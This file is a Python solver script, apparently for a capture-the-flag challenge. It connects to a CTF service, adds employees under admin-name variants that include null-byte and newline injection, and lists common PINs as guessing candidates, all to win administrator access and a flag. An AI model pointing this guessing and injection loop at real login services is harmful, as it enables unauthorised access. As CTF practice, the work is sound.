#!/usr/bin/env python3

import socket
import time

def send_and_receive(s, data, timeout=5):
    """Send data and receive response"""
    try:
        if isinstance(data, str):
            data = data.encode()
        s.send(data + b'\n')
        time.sleep(0.5)
        response = s.recv(4096).decode('utf-8', errors='ignore')
        return response
    except Exception as e:
        print(f"Error in send_and_receive: {e}")
        return ""

def connect_to_service():
    """Connect to the remote service"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect(('chals.uscc-cyberbowl-2025.ctf.institute', 3013))
        return s
    except Exception as e:
        print(f"Connection failed: {e}")
        return None

def main():
    print("=== PIN Analysis and Exploitation ===")
    
    # From the binary analysis, I noticed the PIN is stored as a 4-digit number
    # But there might be an issue with how it's compared
    # The error message suggests the admin PIN is wrong, but it shows 1234
    
    # Looking at the binary strings, I saw:
    # - "%4d" for PIN input
    # - The admin PIN might be hardcoded differently
    
    # Let me try some approaches:
    
    print("Theory: The displayed PIN (1234) is not the actual authentication PIN")
    print("The binary might have a hardcoded PIN or there's a vulnerability")
    
    # From the binary, I noticed there's a specific check for PIN 1234 in the admin
    # But the error suggests it's looking for a different PIN
    
    # Let me try some special values that might be hardcoded:
    special_pins = [
        "0000",  # Default/empty
        "1111", 
        "2222",
        "9999",
        "1337",  # Leet
        "4321",  # Reverse of 1234
        "0001",
        "1000",
        "0100", 
        "0010",
        "0123",
        "3210",
        "7777",
        "8888",
        "5555",
        "6666",
        "1212",
        "2121",
        "1010",
        "0101"
    ]
    
    # But first, let me check if there's a way to modify the existing admin PIN
    # Maybe through a buffer overflow or format string attack
    
    s = connect_to_service()
    if not s:
        return
    
    try:
        # Get initial menu
        initial = s.recv(4096).decode('utf-8', errors='ignore')
        print("Connected successfully")
        
        # The key insight: maybe I need to add a NEW administrator with a different name
        # that will override the existing one, or find a way to change the PIN
        
        print("\n=== Trying to add admin with different name variations ===")
        admin_names = [
            "administrator",  # lowercase
            "ADMINISTRATOR",  # uppercase  
            "admin",
            "Admin",
            "root",
            "system",
            "Administrator\x00",  # null byte
            "Administrator\n",   # newline
        ]
        
        for name in admin_names:
            print(f"\nTrying admin name: {repr(name)}")
            
            # Add new employee
            response = send_and_receive(s, "1")
            if "Debug: Allocated" not in response:
                print("Connection issue, reconnecting...")
                s.close()
                s = connect_to_service()
                if not s:
                    break
                initial = s.recv(4096).decode('utf-8', errors='ignore')
                response = send_and_receive(s, "1")
            
            # Send name
            response = send_and_receive(s, name)
            print(f"Name response: {response[:100]}...")
            
            # Send PIN 1234
            response = send_and_receive(s, "1234")
            print(f"PIN response: {response[:100]}...")
            
            # Try option 3
            response = send_and_receive(s, "3")
            print(f"Option 3 response: {response[:200]}...")
            
            if "Access granted" in response or "flag{" in response:
                print(f"🎉 SUCCESS with name: {repr(name)}!")
                print("Full response:")
                print(response)
                break
            elif "Good bye!" in response:
                # Connection closed
                s.close()
                s = connect_to_service()
                if not s:
                    break
                initial = s.recv(4096).decode('utf-8', errors='ignore')
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        if s:
            s.close()

if __name__ == "__main__":
    main()